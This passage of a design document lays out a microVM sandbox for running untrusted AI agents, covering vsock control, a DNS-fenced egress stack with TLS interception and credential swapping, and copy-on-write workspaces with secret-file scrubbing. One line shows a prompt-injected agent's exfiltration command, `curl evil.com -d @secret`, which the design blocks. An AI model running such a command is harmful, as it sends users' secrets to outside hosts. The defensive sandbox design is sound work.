# libkrun sandbox — the substrate pivot (Docker → microVM)

**Status:** direction / spec (not yet built). Supersedes the Docker-daemon local
backend and the whole remote-backend line ([remotes-redesign.md](./archive/remotes-redesign.md),
[remotes.md](./archive/remotes.md) — now deprecated).

## Why

Docker was chosen for one reason: **VPS ubiquity for the remote plane.** That
reason is gone — "remote" resolved to *Cloudflare-managed* or *pillbox-running-
locally-on-the-VPS* (see [vnext.md](./vnext.md)), neither of which needs a
local Docker daemon driven over SSH. With the remote rationale removed, the
local runtime is free to be the *best* one instead of the most *compatible* one.

[libkrun](https://github.com/containers/libkrun) is that runtime:

- **Secure** — the isolation boundary is a **VM** (KVM on Linux, Hypervisor.
  framework on macOS), not a shared kernel. This turns the pitch's first word
  from aspirational to real: safe to run a prompt-injected agent. (Today's
  threat model explicitly does *not* defend against container escape.)
- **Fast / small** — sub-100ms boot, tiny footprint, **no daemon** (a linked
  library + a spawned helper, not `dockerd` / Docker Desktop). No-daemon finally
  *matches* pillbox's identity instead of fighting it.
- **macOS-native** — HVF microVMs directly, no Docker Desktop (which is itself a
  hidden Linux VM running containers; libkrun is the leaner direct path).

**We own it, we don't fork it.** libkrun is an LGPL *library*; we FFI its C API
(`include/libkrun.h`) and depend on the `libkrunfw` kernel artifact — a normal
library dependency, no vendored or forked third-party code. The sandbox is
table-stakes; **the layer above — drive-from-chat + great telemetry — is what's
ours**, and owning the substrate is what keeps that layer's channel clean (see
[§ Channels](#channels)).

## Architecture

```
host: pillbox  ──FFI──▶ libkrun (KVM/HVF microVM)
   │                       │
   │  vsock (control)      ├─ virtio-fs ← workspace (COW snapshot)
   │  ◀───────────────────▶│  pillbox-init (PID 1): runs the agent,
   │  frames + §0 events    │              speaks the control channel
   │                       │
   └─ smoltcp egress stack ◀─ virtio-net ← agent's internet
      (vault v2 + egress firewall + telemetry)
```

- **`pillbox-init`** — a small Rust binary, PID 1 in the guest. Boots, execs the
  agent (or `opencode serve`), and exposes the control channel. The natural home
  for the in-guest half of the frame protocol + the §0 event producer.
- **Rootfs** — an OCI image works as the microVM rootfs (krunvm/crun-krun
  style), so the existing runner-image artifact survives the pivot; a slimmer
  custom rootfs is an option later.
- **Workspace** — host dir shared via **virtio-fs**; a **COW snapshot**
  (FICLONE / `clonefile(2)`) gives near-instant per-run isolation and is the
  clean local "fork N agents from one base" primitive. rustic stays the
  *durable / cross-machine* store; COW is the *fast local fork*. They compose.

### Channels

Two **separate** channels — do not conflate:

- **Control (`pillbox-init` ↔ host): frame protocol + §0 events → vsock.**
  virtio-vsock is the purpose-built host↔guest pipe, independent of the guest's
  internet. *Open question (resolved):* vsock-on-HVF via libkrun could have been
  finicky — prototype it first, fall back to a forwarded localhost socket if
  needed. `pillbox-init` doesn't care which. (It worked; see step 2.)
- **Egress (the agent's internet) → a userspace TCP stack ([smoltcp](https://github.com/smoltcp-rs/smoltcp)).**
  libkrun offers TSI (zero-config socket impersonation, simplest boot, little
  control) vs **virtio-net + a host-side userspace stack** that **terminates the
  guest's connections in userspace**. That termination point is exactly where the
  **vault, the egress firewall, and network telemetry** live, so owning it
  serves all three priorities. Boot on TSI; move egress to smoltcp when wiring
  vault/egress/telemetry (i.e. early).

**The convergence:** the two differentiators — *drive from Slack/Discord/chat*
and *great telemetry* — ride the **same** `pillbox-init` channel: `send` →
control → agent (drive); agent events → control → host → §0 log / OTLP
(telemetry). One owned channel, both jobs. That is the concrete reason to own
the substrate rather than rent a sandbox SDK.

## Security model (by axis)

- **Network / credentials** (vault v2): default-deny egress allowlist +
  **credential substitution gated on SNI + DNS-pin** (the real key is swapped in
  only when the SNI is allowlisted AND the destination IP is in the sandbox's own
  DNS-answer set for that host; the agent never sees the key). A direct upgrade to
  today's blind stub-swap, living in the smoltcp egress stack. We **MITM for
  *substitution*** (provider hosts) and **fence** (default-deny + DNS) for
  non-provider egress — see
  [§ Why MITM](#why-mitm-at-all--substitute-vs-fence-2026-06-01-review).
- **Filesystem / workspace**: COW snapshot + **non-negotiable secret-file
  exclusion** (`.env*`, `*.pem`, `.ssh/`, `.aws/` — an untrusted repo's config
  cannot negate it) + multi-layer policy where an untrusted repo **cannot widen**
  egress or loosen a security setting.
- **Egress profiles**: `permissive` / `standard` / `locked` — great UX,
  orthogonal to the review gate.
- **Diff-review-before-flush is OPTIONAL** — a blocking human gate before every
  flush fights pillbox's driven/chat/autonomous priority. *Interactive* mode may
  offer it; *driven* mode uses COW + snapshot-and-pull.

## What survives the pivot (most of the recent work)

The §0 / attach / opencode work is **transport-agnostic at its core**, so it
ports by swapping only the bottom:

| Layer | Survives unchanged | Changes |
|---|---|---|
| §0 log, event mapper, `drain_sse`, synth | ✅ (consume a `Read`/payloads) | — |
| frame protocol, `session send/watch/subscribe`, pump | ✅ surface | transport: `docker exec` → vsock |
| opencode integration | ✅ the `message.*` mapper (the brain) | bridge: `docker exec curl` → vsock / guest-net |
| vault | ✅ concept | sidecar-in-container → smoltcp egress proxy (vault v2) |
| sandbox backend | — | `sandbox::docker` → a `libkrun` backend |

## Superseded / deprecated by this pivot

- **Local Docker backend** (`sandbox/docker.rs`) → a libkrun backend. Code
  currently ships (the default local backend); deprecated in direction.
- **Remote backends** — `docker://`, `ssh://`, `e2b://` and
  [remotes-redesign.md](./archive/remotes-redesign.md). Already **removed** from
  the codebase: "remote" is now Cloudflare-managed or pillbox-local-on-the-box;
  the SSH-driven-daemon model is retired.
- The Docker **runner image** framing in [runner-image.md](./runner-image.md) →
  microVM rootfs (OCI still usable).

## Proven recipe — macOS boot (2026-06-01) ✅

Step 1 done: a Linux 6.12.76 microVM boots on macOS 26 (Apple Silicon, HVF) via
Rust→libkrun FFI and runs a command in an Alpine rootfs. The working recipe
(proof crate at `~/code/libkrun-boot`, kept out of this repo until it graduates
into a `pillbox-krun` backend):

- **Install:** `brew install slp/krun/libkrun` (bottled; pulls `libkrunfw`).
- **FFI:** hand-written `extern "C"` — no bindgen needed for the minimal surface:
  `krun_create_ctx` → `krun_set_vm_config(ctx, vcpus, ram_mib)` →
  `krun_set_root(ctx, rootfs_dir)` → `krun_set_workdir` →
  `krun_set_exec(ctx, path, argv_after_0, envp)` → `krun_start_enter` (never
  returns; guest stdout streams to the host; process exits with the guest's status).
- **Rootfs:** a plain directory works as the virtio-fs root — an extracted OCI/
  Alpine `minirootfs` tarball is enough (OCI-image-as-rootfs confirmed viable).
- **macOS gotcha (the time-sink):** libkrun `dlopen`s a *bare* `libkrunfw.5.dylib`
  via `libloading`. macOS 26 does **not** resolve it via `DYLD_LIBRARY_PATH`
  (stripped/ignored even for linker-adhoc binaries) nor the `$HOME/lib` fallback.
  It resolves against the **main executable's `LC_RPATH`** — so the consumer
  binary needs `-Wl,-rpath,/opt/homebrew/lib`. Build it in `build.rs`.
- **HVF entitlement:** the binary must be codesigned with
  `com.apple.security.hypervisor`:
  `codesign -f --entitlements ent.plist -s - <binary>` (ad-hoc is fine; `cargo`
  re-signs the binary each build, so re-sign after every `cargo build`).
- **vsock-on-HVF: WORKS** (step 2, below) — no SSH fallback needed.

### Control channel (step 2, proven) ✅

`pillbox-init` (the guest workload) → host frame round-trip over vsock, on HVF:

- **Host:** `krun_add_vsock_port(ctx, PORT, "/tmp/pillbox-ctrl.sock")` — default
  direction is *guest connects out, host listens*. The host `UnixListener::bind`s
  that path **before** `krun_start_enter`; libkrun connects to it when the guest
  dials the vsock port. (`krun_add_vsock_port2(..., listen=true)` flips it: guest
  listens, host initiates — use that later if the host should attach on demand.)
- **Guest:** `socket(AF_VSOCK)` → `connect({ cid: VMADDR_CID_HOST=2, port: PORT })`
  → write the length-prefixed frame. Retry the connect (~5s) since the host
  listener races boot.
- **Guest binary:** `pillbox-init`, cross-compiled to
  `aarch64-unknown-linux-musl` (static, `libc` for AF_VSOCK) with
  `CARGO_TARGET_AARCH64_UNKNOWN_LINUX_MUSL_LINKER=rust-lld` — no external gcc;
  copied into the rootfs and set as `krun_set_exec` target.
- **Note:** the exec'd binary is the guest *workload*, not literally PID 1 —
  libkrun runs its own internal init and spawns our process as a child. So
  `pillbox-init` doesn't need full-init duties; it just owns the agent + the
  control channel and parks while serving.

### Attach port (step 3, proven) ✅

The **real** `Frame` attach protocol round-trips over the vsock channel on HVF —
the docker→vsock swap is the bottom byte-pipe only; codec + lifecycle unchanged.

- **Codec is production, not a stand-in:** `src/attach/frame.rs` is vendored
  *verbatim* into the proof crate (`shared/frame.rs`) and compiled by both ends.
- **Guest = pty-host role** (mirrors `src/attach/host.rs`): `pillbox-init`
  `forkpty`s `/bin/sh`, sends a `Snapshot` on connect, streams PTY output as
  `Data`, applies `Input`→PTY and `Resize`/`Hello`→`TIOCSWINSZ`, and reaps the
  child to send `Exit(code)`. No new deps — raw `libc::forkpty` (cross-builds to
  aarch64-musl with rust-lld, no gcc).
- **Host = pump role** (mirrors `src/attach/pump.rs`): `Hello` → read
  `Snapshot`/`Data` → send one `Input` → read `Exit`.
- **fd-type gotcha:** the vsock fd is a real `SOCK_STREAM` socket, so wrapping it
  in `UnixStream::from_raw_fd` works (std uses `recv`/`send`). The **PTY master
  is not a socket** — wrap it in `File` (uses `read`/`write`); a `UnixStream`
  there `ENOTSOCK`s.
- **Proof asserts execution, not echo:** the host types `echo READY-$((6*7));
  exit` and asserts `READY-42` comes back — `42` is absent from the typed line,
  so it proves the guest shell *evaluated* the input (full bidirectional path),
  not that the terminal echoed it. `exit_code=0`, clean teardown.

### §0 producer (step 4, proven) ✅

The structured §0 control plane streams over a **second, concurrent** vsock port
(1025) alongside the attach data plane (1024) — the two-channel design the
architecture diagram calls for, now proven to coexist on libkrun.

- **Two ports, concurrent:** the host calls `krun_add_vsock_port` per port; the
  guest dials both. The binary `Frame` PTY stream and the §0 NDJSON stream
  interleave on the wire without interference (separate streams) — that was the
  open transport question, now closed.
- **Real contract types, both ends:** `src/contract.rs`'s `Event`/`Payload` are
  vendored into `shared/contract.rs`; the guest serializes via the real
  `Event::session(...)` builder, the host deserializes into the real types. The
  wire is the exact production shape (camelCase fields, snake_case `type` tags,
  RFC3339 `at` from the `time` crate).
- **Host is the seq authority:** producers emit `seq == 0`; the host stamps the
  monotonic per-session `seq` on append, mirroring `SessionLog::append`.
- **Durable spine round-trips:** the host persists `log.jsonl` (byte-for-byte the
  `SessionLog` on-disk form — droppable at `<pillbox>/sessions/<id>/log.jsonl`
  and `session watch`/`subscribe` read it unchanged), then replays it: 8 events
  re-parse, seqs gap-free `1..N`. That's the read surface the gateway sits on.
- **What changes at graduation:** swap the proof's flat-file drain for the real
  `SessionLog` (seq + notify-follow already built, transport-agnostic); the guest
  half is the event mapper (`drain_sse` / transcript tailer) feeding this port.

## Egress + vault v2 (step 5 — design)

This is the **novel** step — not a port of existing logic like 3/4, and the one
that makes the pitch's first word (*secure* — safe to run a prompt-injected
agent) real beyond VM isolation. It's the hardest piece in the plan, so it gets
a design before a spike.

### The networking decision: boot on TSI, egress on virtio-net + smoltcp

libkrun offers two ways to give the guest a network:

- **TSI** (Transparent Socket Impersonation) — libkrun proxies the guest's
  socket syscalls through the *host kernel's* sockets. Zero-config, simplest
  boot. But the host kernel makes the real connections, so pillbox gets **no
  userspace termination point it controls** — nowhere to gate, MITM, or measure.
  Fine for "just give it internet"; useless for vault v2.
- **virtio-net + a host-side userspace TCP stack ([smoltcp](https://github.com/smoltcp-rs/smoltcp))**
  — the guest sees a real NIC; its packets land in a stack **pillbox owns and
  terminates in userspace**. That termination point is the single control plane
  for all three priorities (gate, vault, telemetry).

**Decision:** boot on TSI (steps 1–4 don't need egress); switch to
virtio-net + smoltcp *in this step*, because every vault-v2 control lives at
that userspace termination point. Egress is the reason to own the stack.

### Three egress tiers at the termination point

Every guest-initiated connection hits the smoltcp stack; pillbox reads the TLS
**ClientHello SNI** at connect time and routes to one of three tiers:

1. **Provider host** (`api.anthropic.com`, `api.openai.com`, `github.com` for the
   token, …) → **MITM-terminate** with the per-pillbox CA (guest already trusts
   it), hand the plaintext `Request`/`Response` to **today's `VaultProvider`
   stack unchanged** (stub→real out, real→stub in, rotate-token persist), and
   emit gen_ai/usage telemetry. The provider logic is hyper-level and survives
   the pivot verbatim — only its *substrate* moves (sidecar + `HTTPS_PROXY` →
   smoltcp).
2. **Allowlisted non-provider host** (per profile: package registries, git
   hosts, …) → **TCP pass-through**, no MITM (no credential to swap, so no cert
   trust needed — the guest sees the real upstream cert). Allowed, but only SNI/
   byte-count telemetry, never plaintext.
3. **Everything else** → **default-deny**: RST at connect. This is the
   exfiltration guard today's proxy lacks (`vault/server.rs` passes unmatched
   hosts through unmodified). An injected agent's `curl evil.com -d @secret`
   never opens a socket.

### The two hardening gates v2 adds over today's blind swap

Today's swap is keyed on the *claimed* host and releases the real credential to
whatever that host resolves to. v2 adds:

- **Default-deny allowlist** (tier 3 above) — egress is closed by default; the
  agent reaches only what the profile permits. This is also the **prerequisite
  for cross-user pooling**: the [swarm-memory](./swarm-memory.md) scrub is
  zero-false-negative only when *all* egress is inspected, which only holds once
  unmatched hosts can't slip out (see [security.md](./security.md)).
- **Destination-pinned credential release (DNS-pin)** — the real key is injected
  only when **the TLS SNI matches an allowlisted host AND the connection's
  destination IP is in the DNS-answer set the *sandbox's own* lookup returned for
  that host**. Binds the credential to a **proven** destination, defeating DNS
  spoofing / a hijacked `api.anthropic.com` / "spoof the SNI, connect to an
  attacker IP". It **supersedes the spike's `verify_upstream`** (a second,
  blocking TLS handshake to the real host — which the quality review flagged for
  stalling the poll loop): DNS-pin is cheaper (no second handshake), non-blocking,
  and equally strong — snoop the guest's DNS answers at the stack, pin the IPs
  (TTL-bounded), gate on them.

### Why MITM at all — substitute vs. fence

There is **no credential-injection route that avoids terminating TLS** — the
credential lives in the encrypted body, so rewriting it is inherently
decrypt-modify-re-encrypt. The genuine architectural fork is **substitute** vs.
**fence**:

- **Substitute (MITM)** — the guest only ever sees a stub; rotation never reaches
  it. Cost: CA injection into the guest trust store; cert-pinned clients need an
  explicit bypass list.
- **Fence (no substitution)** — real creds live in the guest, safety comes purely
  from default-deny egress + DNS-pinned allowlist + secret-file exclusion.
  Simpler, no CA, immune to pinning — but the agent's process holds the real key
  and rotated OAuth tokens reach the guest.

**Decision: MITM stays**, scoped to provider hosts (tier 1). Pillbox's threat
model is an untrusted/prompt-injected agent making *arbitrary* egress, and the
**subscription/OAuth keystone requires that refresh-token rotation never leak
back to the guest** — both point to substitution. We use the *fence* as the floor
for **non-provider** hosts (tiers 2–3), so it isn't either/or: fence everything,
MITM only where a credential is injected.

**Considered and deferred — base-URL override**: point the agent's
`ANTHROPIC_BASE_URL` at an explicit local injecting proxy — no CA spoofing, no
cert-pinning risk. Viable since pillbox already injects per-agent env, but it
covers only cooperating SDKs/known hosts (not the agent's `curl`/git/MCP egress)
and the OAuth refresh path is messier. A per-agent friction-reducer layered on
the MITM+fence base, not a replacement.

### Egress profiles

Orthogonal UX over the allowlist; the secret-file exclusion (step 6) is the
filesystem sibling, kept separate.

- **`locked`** — allowlist = provider hosts only. The agent can authenticate and
  nothing else. Maximum safety for fully-untrusted code.
- **`standard`** (default) — providers + a curated dev allowlist (git hosts,
  common package registries).
- **`permissive`** — all egress allowed, but provider hosts are *still*
  MITM+swapped (≈ today's posture). For code you trust.

An untrusted repo **cannot widen** its own profile (non-negotiable) — the
profile is set by the invoker, not the workspace.

### Step-5 spike (proven) ✅ — egress substrate + vault-v2 mechanics

The egress termination point AND the vault-v2 gates exist on HVF, end to end.
Proof binary `netspike` + the guest's `pillbox-init net` branch (proof crate at
`~/code/libkrun-boot`):

- **Phase 1 — frame transport (the make-or-break unknown):** `krun_add_net_unixstream(ctx,
  NULL, fd, mac, features=0, flags=0)` with `fd` one end of a `socketpair`.
  libkrun drives the guest's virtio-net as **passt-protocol** frames —
  `[u32 BE len][raw Ethernet frame]` — to our end. `features=0` disables offloads
  (TSO/CSUM) so each frame is one real ≤MTU Ethernet frame. The guest's ARP
  who-has for the gateway arrived intact. **This is the analogue of "does vsock
  work on HVF" for step 2 — and it does.**
- **Phase 2 — userspace termination:** a host-side **smoltcp** `Interface` over a
  `phy::Device` that pops inbound frames off the socketpair and writes outbound
  ones back (passt-framed). It owns the gateway IP `10.0.2.2/24` + a gateway MAC,
  answers ARP, and **terminates the guest's TCP** — a real in-guest
  `TcpStream::connect` completes against the userspace stack.
- **Phase 3 — DNS-fence + MITM + DNS-pin (the hardened gate):**
  - **DNS fence:** the stack runs a **DNS resolver** on
    UDP `:53` (the guest's `resolv.conf` → `10.0.2.2`). A non-allowlisted name
    gets **NXDOMAIN** — verified: `evil.example.com` → NXDOMAIN, the guest can't
    even resolve it. An allowlisted name resolves (to the proxy IP) and is
    **pinned**.
  - **DNS-pin credential gate:** on TLS, the stack
    drives a `rustls::ServerConnection` off the poll loop and gates on **SNI ∈
    allowlist AND SNI ∈ the DNS-pin set** — a forged-SNI / hardcoded-IP
    connection that skipped our resolver is RST. This **replaced the spike's
    blocking `verify_upstream`** (the 2nd-handshake the review flagged): the pin
    is non-blocking and proves the guest legitimately resolved that exact host.
  - **MITM + swap (kept):** for an allowed+pinned host the guest's busybox
    `wget`+`ssl_client` does a **CA-verified** handshake (trusting our MITM CA at
    `/etc/spike-ca.pem`), the stack decrypts `GET /v1/ping` and **swaps the
    `x-api-key` stub→real** (real never reaches the guest — where the in-repo
    `VaultProvider` plugs in). Guest got `200 ok`, exit 0.
  - **default-deny by-IP (kept):** a direct connect to an IP the stack doesn't
    own (`10.0.2.99`) gets no SYN-ACK → the guest's connect fails.
- **Self-replenishing listener pool:** holds "≥ `POOL_MIN_FREE` sockets in
  LISTEN, capped at `POOL_MAX`" — tops up when a SYN takes a listener, recycles
  fully-closed ones. Scales to concurrent egress connections, not a fixed count.

**Crypto:** `ring`-backed `rustls` + pre-generated test PKI (`certs/`, loaded via
`rustls-pemfile`) — no cmake/aws-lc/C toolchain, no rcgen API churn.

**Still in-repo work (not a substrate unknown):** re-host the *exact* in-repo
`VaultProvider` trait + hudsucker request/response handlers (hyper-level, already
proven); **NAT-forward + splice** the swapped request to the *real* upstream (the
spike resolves allowlisted names to the proxy IP and synthesizes a `200` rather
than forwarding); and **IP-level pin** to the real resolved address (the spike's
pin is name-level — it answers the proxy IP for all allowlisted names). The
mechanics this proves — DNS fence + DNS-pin + MITM + swap on the owned stack —
are end-to-end green. Profiles (`locked`/`standard`/`permissive`) are allowlist
contents over this same gate.

**In-repo-landing checklist (flagged by a 2026-06-01 quality review; deferred
off the throwaway spike, mandatory for the port):**
- **Split `drive_mitm` into seams.** The spike packs TLS-pump (smoltcp↔rustls),
  the SNI gate, the credential swap, and dest-verify into one ~90-line function.
  The port wants three: **(A)** a transport-only TLS pump, **(B)** the policy
  gate (SNI → allow/deny + the verified host), **(C)** request-transform (swap +
  verify + response) where `VaultProvider` injects. Gate runs before the
  plaintext drain so only ALLOW paths pay it.
- **Model the connection as a `MitmPhase` enum**, not the spike's
  `gated`/`handled` bool pair — adding a phase (drain, await-vault) shouldn't mean
  another negated-conjunction check.
- ✅ **DNS-pin replaced `verify_upstream`** (done in the spike: a UDP `:53`
  resolver pins allowlisted names, the TLS gate requires SNI ∈ pin set,
  non-blocking). In-repo, **upgrade to IP-level pin** — resolve allowlisted names
  to their *real* addresses and gate on dest-IP-in-the-resolved-set (the spike
  answers the proxy IP for every allowlisted name, so its pin is name-level).
- ✅ **DNS fence done in the spike** (NXDOMAIN for non-allowlisted names). In-repo,
  add **TTL-bounded IP rules + conntrack** for non-provider tiers so
  MITM stays scoped to provider hosts, plus **NAT-forward** allowlisted
  non-provider hosts to the real upstream (the spike doesn't forward).
- **Event-driven wakeup**, not the spike's fixed 2 ms poll-loop sleep (drive off
  the rx-queue / smoltcp `poll_at`).
- **Give the pin table a type (`PinTable`), not a loose `pins: HashSet`.** It's
  the contract between the resolver and the gate; model it explicitly with
  `record(name, ips, ttl)` / `authorized(sni, dest_ip, now)` / `evict_expired` —
  which also *is* the TTL + IP-level-binding upgrade. The single poll loop is
  **correct** for smoltcp (one `poll()` advances all sockets) — don't split it
  into threads; just lift the pin table out of the loop body into its own type.
  The DNS-before-gate ordering is fail-closed (an unpinned SNI is RST), so it's
  safe, not a hazard.
- **The egress stack is per-sandbox, and the sandbox is the trust unit.** One
  stack + one `PinTable` + one vault + one poll loop per microVM. This is what
  makes multiplayer safe *and* scalable: fork-N = N independent loops (horizontal,
  no contention), and the trust boundary lines up with the credential/pin
  boundary. **Never share one egress stack across trust domains** — that both
  leaks A's pins/creds to B's connections *and* creates the only real god-loop
  bottleneck. Multiplayer-in-one-box = mutually-trusting collaborators sharing a
  workspace + its creds; mutual distrust = separate sandboxes (free under this
  model). A **managed multi-tenant tier** (a shared egress gateway fronting many
  sandboxes) is a *separate* design — per-tenant pin/vault + fair scheduling +
  multi-threaded — not this single-sandbox loop scaled up.

### Step-6 spike (proven) ✅ — CoW workspace + secret exclusion

The filesystem half of the sandbox, end to end on HVF. Proof binary `wsspike` +
the guest's `pillbox-init ws` branch:

- **Phase 1 — virtio-fs second share (the substrate unknown):**
  `krun_add_virtiofs(ctx, "workspace", host_dir)` attaches a second share; the
  guest mounts it with `mount(2)` fstype `virtiofs` at `/workspace`, reads the
  shared files, and writes back. (The root is the first virtio-fs; this is a
  second, mounted explicitly by the guest.)
- **Phase 2 — CoW clone:** the host shares a **`clonefile(2)`** copy-on-write
  clone of the base workspace, **not the base**. Measured **370µs** — genuinely
  CoW, not a deep copy, so "fork N agents from one base" is ~free. The guest's
  `RESULT.txt` write landed in the clone; the base was untouched (its `.env`
  still there, no `RESULT.txt`).
- **Phase 3 — non-negotiable secret-scrub:** before sharing, the host removes
  `.env*` / `*.pem` / `.ssh/` / `.aws/` from the clone. The denylist is
  pillbox-controlled and **read from nothing in the workspace** — the base's
  `.pillboxinclude` asking to keep `.env` was visible to the guest but had **zero
  effect** (the `.env` was gone). Kept files (`src/app.py`, `README.md`) survived.
- **Phase 4 — diff/flush:** `diff(clone, base)` = the guest's `RESULT.txt` — the
  result surface a driven run flushes/snapshots, with the base as the fork point.

**In-repo landing:**
- **Reuse the canonical denylist** — the spike hand-rolled a crude `is_secret`;
  the repo already has `workspace::ingest` (`is_secret_dir` / `is_secret_basename`
  / `IngestPlan`) from the workspace-ingest work, which is *better* (covers
  `.gnupg`, spares `.env.example`/`.env.sample` templates, and *reports* dropped
  secrets — no silent caps). The CoW path must call it, not duplicate it.
- **Compose with rustic, don't replace it** — the flow is `rustic pull` (or cwd)
  → scrub → `clonefile` fork → virtio-fs share → run → `rustic push` (result).
  rustic (`workspace::rustic`) is the durable/cross-machine store and survives
  the pivot unchanged; CoW is the fast *local* fork. CoW replaces the old
  docker `tar-cp`/bind-mount materialization, not the store.
- overlayfs CoW for Linux hosts (`clonefile` is APFS/macOS); the fork-N fan-out.

**The fork primitive moves layers by placement; the snapshot layer doesn't.**
The workspace *contract* is placement-independent — `materialize base → isolated
run → capture result`. Only the *fork/materialize mechanism* swaps. **rustic is
the through-line** (the one snapshot layer everywhere; R2 is just its cloud
backend, S3-compatible, and rustic already targets S3-shaped backends). CoW is a
**local-only** optimization of the fork step; on a managed/Cloudflare tier that
step is served by **hydrating from the rustic/R2 snapshot** instead — *fork-from-
store* (see `pillbox-workspace-fork-substrate`). Snapshotting itself is rustic's
job in both; `clonefile` is an instant *fork*, not a managed snapshot (no
catalog/identity/history) — you `rustic push` the clone to get a milestone.

| | Sandbox | Fork primitive | Durable store |
|---|---|---|---|
| **Local (libkrun)** | our microVM (CoW + virtio-fs + our smoltcp vault) | `clonefile` FS-CoW (~370µs, ephemeral) | rustic → local disk |
| **Managed (Cloudflare)** | their Sandbox SDK (their R2-fs + Outbound egress) | store-hydrate from an R2 snapshot | rustic → R2 |

Caveat: the managed tier rents their sandbox + egress, so the step-5 vault and
the CoW fork are **local differentiators** you partly give up there — the local
libkrun tier is where pillbox owns the substrate; Cloudflare is convenience
placement behind the same `SandboxBackend` trait + workspace/snapshot contract.

## Build order (proof-first)

1. ✅ **Boot proof** — done. FFI = hand-written; rootfs = OCI/Alpine dir;
   macOS = rpath + hypervisor entitlement.
2. ✅ **`pillbox-init` + control channel** — done. vsock works on HVF; a frame
   flows guest→host over `krun_add_vsock_port`'s unix-socket bridge.
3. ✅ **Attach port** — done. Production `Frame` protocol (Hello/Snapshot/Data/
   Input/Resize/Exit) round-trips bidirectionally over vsock; guest pty-host +
   host pump, codec vendored verbatim. Recipe above.
4. ✅ **§0 producer** — done. `contract::Event` NDJSON streams over a second
   concurrent vsock port → host seq-authority → durable `log.jsonl` → replay
   verified. Real contract types vendored both ends. Recipe above.
5. **Egress + vault v2** — ✅ spiked incl. hardening (virtio-net→socketpair, smoltcp
   TCP termination, **DNS fence (NXDOMAIN) + DNS-pin gate + MITM + credential swap**
   with the guest doing CA-verified TLS — see [§ Step-5 spike](#step-5-spike-proven----egress-substrate--vault-v2-mechanics)).
   **The in-repo landing is not "done" until every security deliverable below ships
   — they are acceptance criteria, not polish** (full rationale: [§ Why MITM](#why-mitm-at-all--substitute-vs-fence-2026-06-01-review),
   [§ hardening gates](#the-two-hardening-gates-v2-adds-over-todays-blind-swap)):
   - [~] **Default-deny egress** — closed unless the profile allows it (the
     exfiltration guard; also the cross-user-pooling prerequisite). *Spiked via the
     DNS fence (NXDOMAIN) + by-IP drop; in-repo: enforce at the IP/conntrack layer.*
   - [~] **Fence the non-provider tiers**: DNS-snoop allowlist →
     NXDOMAIN (✅ spiked) + TTL-bounded IP rules + conntrack + NAT-forward (in-repo).
   - [~] **DNS-pin credential release**: inject the real key only on
     SNI-allowlisted **AND** dest-IP-in-the-sandbox's-DNS-answer-set. *Spiked at
     name-level (replaced `verify_upstream`); in-repo: upgrade to real-IP pin.*
   - [ ] **Re-host the exact `VaultProvider`/hudsucker handlers** + splice the
     swapped request to the verified upstream (vs the spike's synthesized 200).
   - [ ] **Egress profiles** `permissive`/`standard`/`locked`, and an **untrusted
     repo cannot widen** its own profile (set by the invoker, not the workspace).
   - [ ] **No silent MITM bypass** — a cert-pinned/unmatched host is denied or
     explicitly bypass-listed, never silently passed through with a real cred.
6. **Workspace** — ✅ spiked (see [§ Step-6 spike](#step-6-spike-proven----cow-workspace--secret-exclusion)).
   `clonefile(2)` CoW clone (370µs — fork-N is ~free), **non-negotiable secret-file
   exclusion** (`.env*`/`*.pem`/`.ssh/`/`.aws/` scrubbed from the clone; a repo
   file asking to keep them is ignored), shared into the guest over a second
   **virtio-fs** mount; guest writes land in the clone, base stays the immutable
   fork point. In-repo landing: rustic snapshot of the result (flush/pull);
   overlayfs CoW on Linux hosts (clonefile is APFS-only); the fork-N fan-out.

**In-repo landing (graduation) — IN PROGRESS.** Moving the proof crate into the
pillbox repo behind `SandboxBackend`, feature-gated (`libkrun`, OFF by default),
Docker untouched until step 8. Slices (each its own commit, default build green):
  - ✅ **L1 Foundation** — `[features] libkrun`, a conditional `build.rs` (links
    krun only under the feature, no-op otherwise), `sandbox/libkrun.rs` + the FFI,
    selectable for a local run via `PILLBOX_BACKEND=libkrun`. Default build/tests
    unaffected.
  - ✅ **L2 Boot + agent** — `LibkrunBackend::run` boots a microVM and ran Claude
    Code (`2.1.157`) *inside it*, from the real codesigned pillbox binary.
    **Invariant: `krun_start_enter` does NOT return** — it `exit()`s with the
    guest's code — so the backend re-execs a hidden `__krun-vmm` child that
    *becomes* the VM while the parent supervises (and reads the child's exit code =
    the guest's). This subprocess split is the spine for attach + §0. `krun/
    entitlements.plist` + re-codesign after each build. `materialize_rootfs` =
    `docker export` → cached `~/.pillbox/krun/rootfs/<image>` (virtio-fs root).
  - ✅ **L3 Creds + workspace + env** — `run()` mirrors `sandbox::docker::run`:
    shares the auth home live at `GUEST_HOME` (cred check + pretrust seed), CoW-
    clones the workspace + scrubs it via the **canonical `workspace::ingest`**
    denylist (verified: `.env` scrubbed, `app.py` kept), composes env via
    `resolve_run_env`, forwards it as the child's environment (not argv/file).
    Verified: claude launched in the VM with creds + scrubbed workspace + env.
    The parent hands the child a temp-file `VmSpec` (rootfs + shares + exec
    script; no secrets). **Finding for L5:** the run then failed at network
    egress (`ConnectionRefused`) — libkrun's default TSI did *not* carry it. So
    L5 wires virtio-net + smoltcp egress; don't rely on TSI.
    *Deferred dedup (review): the creds/workspace preamble (copy-pasted across
    libkrun + `sandbox::docker::run`×2) → a shared `resolve_run_inputs`,
    and the base `HOME`/`PATH`/`TERM` env (drift hazard vs `base_docker_args_with`)
    → a shared `base_agent_env`. Do as one extraction pass once the libkrun
    backend stabilizes (post-L5) — the shared boundary is still forming.*
  - ✅ **L4 Attach** — the agent runs under the in-guest `pillbox pty-host
    --vsock-port` serving the real `attach::frame` protocol; the parent runs
    `attach::pump`. **Direction: guest dials the host** (`VMADDR_CID_HOST`,
    default `krun_add_vsock_port`) — the parent binds the listener before boot and
    `accept()`s, so there's no connect-before-ready race (the `port2 listen=true`
    "guest listens" direction *did* race — first cut failed there). A vsock fd
    wraps as `UnixStream` → `handle_client` reused unchanged; `host.rs` factored
    into `spawn_pty_session` so unix (docker/ssh) + vsock share it. Verified:
    `--version` output reached the host pump over vsock. **Needs a runner image
    built from this src** (the guest pillbox must have `--vsock-port`).
  - ✅ **L5a Egress transport + DNS fence** — virtio-net socketpair in the VMM
    child → `egress::run` (smoltcp `Device` + poll loop + DNS responder), spawned
    beside `start_enter`. DNS fence: `known_secrets` provider hosts resolve to the
    gateway + get **pinned**; everything else NXDOMAINs (default-deny). Guest NIC
    up via `ip` (`iproute2` added to the runner). **Live-verified**
    (`pillbox-runner:l5a`): claude pinned `api.anthropic.com`; `platform.claude.com`
    / `downloads.claude.ai` / datadog all fenced. Host-side diagnostics → a file
